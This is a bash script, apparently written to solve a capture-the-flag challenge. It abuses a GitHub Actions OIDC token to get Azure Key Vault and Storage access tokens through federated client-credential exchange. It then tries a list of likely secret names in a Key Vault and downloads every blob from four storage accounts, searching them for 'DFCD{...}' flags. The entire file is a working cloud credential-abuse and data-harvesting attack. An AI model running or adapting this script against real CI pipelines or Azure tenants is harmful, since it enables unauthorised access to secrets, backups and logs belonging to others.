#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
exch(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=$1" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'; }
VT=$(exch "https://vault.azure.net/.default")
ST=$(exch "https://storage.azure.com/.default")
echo "=== kv-tbl-sec GET attempts (72ff278a) ==="
for nm in flag FLAG flag-prod prod-flag ctf-flag tbl-flag the-flag dfcd master reporting-flag; do
  v=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$nm?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("value") or d.get("error",{}).get("code"))')
  echo "  kv-sec/$nm = $v"
done
echo "=== STORAGE deep (72ff278a) st_len=${#ST} ==="
for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  echo "###### SA $SA"
  conts=$(curl -sS "https://$SA.blob.core.windows.net/?comp=list" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" | grep -oE "<Name>[^<]+</Name>" | sed -E 's/<\/?Name>//g')
  echo "  containers: [$conts]"
  for c in $conts; do
    blobs=$(curl -sS "https://$SA.blob.core.windows.net/$c?restype=container&comp=list" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" | grep -oE "<Name>[^<]+</Name>" | sed -E 's/<\/?Name>//g')
    for b in $blobs; do
      echo "    BLOB $c/$b"
      curl -sS "https://$SA.blob.core.windows.net/$c/$b" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" | grep -aoiE "DFCD\{[^}]*\}" | sed 's/^/       HIT /'
    done
  done
done
echo END
